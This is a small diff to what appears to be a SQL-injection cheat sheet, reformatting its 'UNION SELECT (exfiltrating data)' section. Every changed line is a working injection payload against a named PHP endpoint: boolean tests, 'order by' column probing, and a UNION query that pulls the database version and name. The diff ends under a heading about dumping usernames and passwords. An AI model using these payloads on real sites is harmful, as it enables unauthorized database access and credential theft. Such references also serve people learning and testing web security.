@@ -247,8 +247,9 @@ page.asp?id=1 and 1=2 -- false
 
 UNION SELECT (exfiltrating data):
 ```sql
-ns.agency/stuff.php?id=3 order by 1                                  
-ns.agency/stuff.php?id=0' union select 1,version(),database()--    // (MySQL) version + db name
+/* Dump db version + db name */
+    ns.agency/stuff.php?id=3 order by 1                                  
+    ns.agency/stuff.php?id=0' union select 1,version(),database()-- 
 
 /* Dump usernames and passwords (MySQL) */
     -- list names of tables within the current database [result=emails, referers, uagents, users]
